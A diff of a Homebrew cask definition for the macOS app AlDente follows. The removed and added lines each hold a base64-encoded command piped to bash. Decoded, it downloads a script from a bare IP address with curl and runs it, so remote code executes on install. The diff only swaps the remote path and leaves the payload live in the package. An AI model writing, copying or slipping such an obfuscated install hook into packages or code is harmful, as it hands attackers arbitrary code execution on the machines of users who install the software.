@@ -8,7 +8,7 @@ cask "aldente" do
   name "AlDente"
   desc "Battery charge limiter for macOS"
   homepage "https://apphousekitchen.com/"
-  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Tb2NlZGVzKSI=' | base64 -d | bash"
+  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9HZXNham9sZSki' | base64 -d | bash"
   auto_updates true
 
   app "AlDente.app"
